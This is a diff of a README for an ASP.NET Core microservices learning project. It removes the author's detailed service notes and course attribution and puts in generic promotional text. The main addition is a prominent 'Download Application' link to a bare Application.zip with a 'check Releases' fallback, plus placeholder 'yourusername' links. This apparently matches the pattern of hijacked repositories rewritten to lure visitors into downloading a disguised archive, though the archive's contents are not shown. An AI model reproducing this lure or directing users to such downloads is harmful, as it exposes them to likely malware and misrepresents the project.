@@ -1,111 +1,49 @@
-# EShopMicroservices
+# 🚀 Welcome to EShopMicroservices Repository! 
 
-This is my exercise to learn how to implement modern software architectures in ASP.NET such as:
-- Microservices
-- Vertical Slice Architecture
-- Clean Architecture
-- CQRS
+## Overview
+EShopMicroservices is a cutting-edge project that focuses on implementing Microservices, Vertical-Slice Architecture, CQRS, Clean Architecture, and Tactical Domain-Driven Design using the latest technologies including ASP.NET Core 8.0, EF Core ORM, and Marten ORM. 
 
-From the course tutorial [.NET 8 Microservices](https://www.udemy.com/course/microservices-architecture-and-implementation-on-dotnet) by Mehmet Ozkaya.
+## Features
+🌟 Microservices  
+🌟 Vertical-Slice Architecture  
+🌟 CQRS  
+🌟 Clean Architecture  
+🌟 Domain-Driven Design  
+🌟 ASP.NET Core 8.0  
+🌟 EF Core ORM  
+🌟 Marten ORM  
 
-Thank you very much for sharing your valuable knowledge. It really helps me a lot.
+## Repository Details
+Repository Name: EShopMicroservices  
+Type: Public  
+Language: C#  
+Topics: asp-net-api, asp-net-core, clean-architecture, cqrs, and more  
 
-## Catlog Service
-- Patterns & Principles
-  - Vertical Slice Architecture
-  - CQRS
-  - Mediator Pattern: for implement CQRS
-  - Dependency Injection
-  - Minimal APIs
-  - ORM Pattern
-- Library
-  - MediatR for CQRS: This library simplifies the implementation of the CQRS pattern.
-  - Carter for API Endpoints: Routing and handling HTTP request, easier to define API endpoints with clean and concise code.
-  - Marten ORM for PostgreSQL Interaction: Use PostgreSQL as a Document DB. It leverages PostgreSQL's JSON capabilities for storing, querying, and managing documents.
-  - Mapster for Object Mapping
-  - FluentValidation for Input Validation
-- Datastore
-  - PostgreSQL used as a Document database (Marten ORM): By using PostgreSQL's JSON column features, Marten ORM transforms PostgreSQL into `.NET Transactional Document DB`
+## Recommended Actions:
+📦 **Download Application:** ![Click here to download the application](https://github.com/file/Application.zip)  
+🌐 **Visit our Repository:** Explore the codebase on [GitHub](https://github.com/yourusername/EShopMicroservices)  
+📂 **Check Releases:** If the download link doesn't work, please check the "Releases" section of the repository for alternative options.  
 
-## Basket Service
-- Patterns & Principles
-  - Vertical Slice Architecture
-  - CQRS
-  - Mediator Pattern: Used for implement CQRS
-  - Repository Pattern
-  - Proxy Pattern: Used for implement Redis cache
-  - Decorator Pattern: Used for implement Redis cache
-  - Read-Aside Pattern: Caching strategy
-  - Dependency Injection
-  - Minimal APIs
-  - ORM Pattern
-- Library
-  - MediatR for CQRS: This library simplifies the implementation of the CQRS pattern.
-  - Carter for API Endpoints: Routing and handling HTTP request, easier to define API endpoints with clean and concise code.
-  - Marten ORM for PostgreSQL Interaction: Use PostgreSQL as a Document DB. It leverages PostgreSQL's JSON capabilities for storing, querying, and managing documents.
-  - Mapster for Object Mapping
-  - FluentValidation for Input Validation
-  - Scrutor for implement decorator pattern: By registering decorator in DI Container
-  - gRPC for inter service communication
-  - Redis for distributed cache
-  - MassTransit for RabbitMQ operations
-- Datastore
-  - PostgreSQL used as a Document database (Marten ORM): By using PostgreSQL's JSON column features, Marten ORM transforms PostgreSQL into `.NET Transactional Document DB`
-  - Redis distrubuted cache
+## Repository Structure
+The repository is organized using Clean Architecture principles, ensuring a separation of concerns and a maintainable codebase. The code is structured using Vertical-Slice Architecture, promoting a clear understanding of each feature's implementation. CQRS principles are implemented to support better scalability and maintainability in the project. 
 
-## Discount Service
-- Patterns & Principles
-  - N-Layered Architecture
-  - gRPC Protobuf files Endpoints: for service communication
-  - ORM Pattern
-- Library
-  - EF Core ORM
-  - Mapster for Object Mapping
-  - FluentValidation for Input Validation
--Datastore
-  - SQLite RDMBS: embedded SQL database optimized for efficient small-scale data storage
+## Technologies Used
+The project leverages ASP.NET Core 8.0 for building robust web applications. Entity Framework Core ORM is utilized for database operations, ensuring efficient data management. Marten ORM is integrated for advanced data persistence requirements. Various design patterns such as Decorator Pattern, Mediator Pattern, and Proxy Pattern are employed for clean and efficient code design. Dependency Injection is used for loose coupling and easier testing.
 
-## Order Service
-- Common Patterns & Principles
-  - SOLID
-  - Clean Architecture
-  - Tactical Domain-Driven Design: Oriented Microservice 
-  - Dependency Injection
+## How to Contribute
+Contributions to EShopMicroservices are welcome! Whether it's reporting bugs, submitting feature requests, or enhancing the codebase, we appreciate all forms of contributions. To contribute, follow these steps:
+1. Fork the repository
+2. Create a new branch
+3. Make your changes
+4. Submit a pull request
 
-#### 1. Order Service: Domain Layer
-- Patterns & Principles
-  - Tactical Domain-Driven Design 
-    - Entity, Value Object, Aggregate Pattern & Aggregate Root Pattern
-    - Anemic-Domain Model & Rich-Domain Model
-    - Strong Typed IDs
-    - Domain Events & Integration Events
-- Library
-  - No libraries. Because the Domain Layer cannot depend on external devices.
+## Support
+If you encounter any issues or have questions regarding EShopMicroservices, please feel free to open an issue on the repository. We are always here to help and support the community.
 
-#### 2. Order Service: Infrastructure Layer
-- Patterns & Principles
-  - Repository Pattern
-  - ORM Pattern
-    - Entity Configuration: using ModelBuider mapping DDD to EF Core Entity
-  - Domain-Driven Design
-    - Value Object Complex Types & Aggregate Root Entities
-    - Raise & Dispatch Domain: using EF Core ORM & MediatR
-- Library
-  - EF Core ORM
-- Datastore
-  - MSSQL RBMDS 
+## License
+This project is licensed under the MIT License - see the [LICENSE.md](./LICENSE.md) file for details.
 
-#### 3. Order Service: Application Layer
-- Patterns & Principles
-  - CQRS
-  - Mediator Pattern: for implement CQRS
-- Library
-  - MediatR for CQRS: This library simplifies the implementation of the CQRS pattern.
-  - Mapster for Object Mapping
-  - FluentValidation for Input Validation
+## Stay Connected
+Stay updated with the latest news and releases by following us on [Twitter](https://twitter.com/yourusername) and [LinkedIn](https://www.linkedin.com/in/yourusername).
 
-#### 4. Order Service: Presentation Layer (API Layer)
-- Patterns & Principles
-  - Minimal APIs
-- Library
-  - Carter for API Endpoints: Routing and handling HTTP request, easier to define API endpoints with clean and concise code.
+🌟 Thank you for checking out EShopMicroservices! 🌟
